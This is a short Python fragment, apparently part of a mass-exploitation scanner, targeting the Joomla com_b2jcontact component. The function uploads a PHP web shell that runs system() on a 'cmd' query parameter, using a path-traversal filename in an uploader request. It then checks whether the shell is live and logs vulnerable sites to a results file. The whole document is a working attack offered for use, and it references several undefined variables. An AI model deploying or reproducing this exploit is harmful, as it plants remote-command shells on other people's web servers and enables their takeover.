import requests


def bj(url):
    payloadshell = '"Vulnnr<?php {});?>"'.format('system({}'.format('$_GET["cmd"]'))
    requests.post(url+"/index.php?option=com_b2jcontact&view=loader&type=uploader&owner=component&bid=1&qqfile=/../../../vuln.php", data=payloadshell, timeout=10)
    CheckSh = requests.get(url + "/components/com_b2jcontact/vuln.php", timeout=10)
    if 'Vulnnr' in str(CheckSh.content):
        filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
        with open(filename, "a+") as f:
            f.write(f"RCE: {req2.url}" + '\n')
        print(f"{PURPLE} [ {GREEN}$ {PURPLE}]{RESET} com_bj Exploit {PURPLE}=> {GREEN}Vuln {RESET}results saved to {GREEN}{filename}")

    else:
        print(f"{PURPLE} [ {GREEN}! {PURPLE}]{RESET} com_bj Exploit {PURPLE}=> {RED}Not Vuln")

